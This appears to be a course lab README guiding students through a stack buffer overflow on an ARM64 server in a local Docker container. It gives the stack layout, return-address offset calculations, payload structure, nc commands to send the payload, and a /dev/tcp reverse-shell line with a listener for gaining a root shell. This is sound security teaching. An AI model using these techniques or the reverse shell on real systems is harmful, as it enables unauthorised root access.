# Task 2: Level-1 Attack

## Objective
Exploit buffer overflow on Level-1 server to execute shellcode with root privilege.

## Target Info
- **IP**: 10.9.0.5:9090
- **Buffer**: 100 bytes
- **Vulnerability**: `memcpy()` copies 517 bytes
- **Debug**: Provides frame pointer + buffer address

## ARM64 Stack Layout
```
Higher addresses
  [foo's Saved FP]     ← 0x...f110 (parent function)
  [foo's Saved LR]     ← 0x...f118 ← WE OVERFLOW TO HERE!
  ↑ Overflow goes UP
  [Buffer]             ← 0x...f0a0 (our buffer in bof)
  [bof's Saved FP]     ← 0x...f080 (can't reach this)
  [bof's Saved LR]     ← 0x...f088 (can't reach this)
Lower addresses
```
**Key**: Buffer overflows FORWARD (upward) to overwrite foo's return address!

## Quick Start

**Prerequisite:** If you haven't already, run the setup first:
```bash
cd ../Labsetup
chmod +x setup.sh  # First time only
./setup.sh
```

### 1. Start Server
```bash
./start_server.sh
# Or: cd ../Labsetup && docker compose up bof-server-L1
```

### 2. Get Addresses
```bash
echo hello | nc 10.9.0.5 9090
```
Note the output values. **Important**: Use **foo's** frame pointer, not bof's!

### 3. Update Exploit
Edit `exploit.py` lines 42-43 with values from server output:
```python
buffer_addr = 0x0000fffffffff0a0       # ← Your value here
foo_frame_pointer = 0x0000fffffffff110 # ← Use "Frame pointer inside foo()"
```

**Key**: In ARM64, you overflow FORWARD to overwrite foo's return address, not bof's!

### 4. Generate and Send Payload
```bash
python3 exploit.py
cat badfile | nc 10.9.0.5 9090
# Or: ./send_payload.sh
```

## Key Calculations

```python
# Return address is stored at: frame_pointer + 8
ret_addr_location = frame_pointer + 8

# Offset from buffer start to return address
offset_to_ret = ret_addr_location - buffer_addr

# Set return address to point into our payload
ret = buffer_addr + 20  # Lands in shellcode/NOP sled
```

## Payload Structure
```
[NOP sled + Shellcode (200 bytes)] [Padding] [Return Address (8 bytes)]
^                                            ^
buffer_addr                                  offset_to_ret
```

## Reverse Shell (Optional)

Modify shellcode command in `exploit.py` line 21:
```python
"/bin/bash -i >& /dev/tcp/10.9.0.1/9090 0>&1                     *"
```

Start listener:
```bash
nc -nv -l 9090
```

Then send exploit to get root shell.

## Success Indicators
- Server output shows your shellcode output
- No "Returned Properly" message
- For reverse shell: connection received on listener

## Troubleshooting
- **Docker permission denied**: Add user to docker group with `sudo usermod -aG docker $USER && newgrp docker`
- **Server crashes**: Return address pointing to invalid memory, try `buffer_addr + 100`
- **"Returned Properly" appears**: Return address not overwritten, check offset calculations
- **Addresses change**: Don't restart container between attempts

## Lab Report Requirements
- Server debug output with addresses
- Offset calculations
- Complete exploit code
- Screenshot of successful execution
- Memory diagram showing payload layout
